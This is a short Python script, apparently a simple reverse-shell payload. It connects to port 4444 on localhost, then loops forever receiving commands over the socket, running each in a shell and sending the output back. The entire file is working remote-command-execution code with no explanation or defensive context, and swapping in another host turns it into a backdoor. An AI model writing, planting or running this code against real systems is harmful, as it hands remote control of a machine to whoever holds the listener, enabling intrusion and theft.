import socket
import subprocess

payload=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
payload.connect(('localhost',4444))
print("Connection Established")
while True:
    cmd=payload.recv(2048).decode('utf-8')
    output=subprocess.check_output(cmd,shell=True)
    payload.send(output)
